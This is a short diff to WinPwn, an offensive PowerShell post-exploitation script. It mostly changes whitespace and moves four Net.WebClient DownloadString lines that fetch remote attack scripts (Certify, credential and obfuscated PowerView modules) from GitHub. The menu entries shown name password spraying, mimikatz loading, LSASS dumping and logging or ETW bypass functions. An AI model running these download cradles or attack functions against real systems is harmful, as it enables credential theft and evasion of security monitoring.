@@ -4553,7 +4553,7 @@ function WinPwn
          [CmdletBinding()]
     Param (
     [alias("help")][Switch]$h,
-		[String]
+	[String]
         $repo,
         [Switch]
         $noninteractive,
@@ -4660,12 +4660,8 @@ __        ___       ____
     $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
     }
 	
-	BlockEtw
+    BlockEtw
 	
-    $Certify = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
-    $SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
-    $viewdevobfs = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewdevobfs.ps1')
-    $admodule = (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADModuleImport.ps1')
 
     if ($noninteractive)
     {
@@ -4770,10 +4766,10 @@ __        ___       ____
 			9{kittielocal}
 			10{adidnsmenu}
 			11{sessionGopher}
-            12{inv-phantom}
-            13{sharpcradle -allthosedotnet}
+                        12{inv-phantom}
+                        13{sharpcradle -allthosedotnet}
 			14{sharpcradle -web}
-            15{domainpassspray}
+                        15{domainpassspray}
 			16{mimiload}
 			17{lsassdumps}
     }
@@ -4782,6 +4778,11 @@ __        ___       ____
      
    
 }
+
+$Certify = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
+$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
+$viewdevobfs = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewdevobfs.ps1')
+$admodule = (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADModuleImport.ps1')
 
 function scriptblocklogbypass
 {
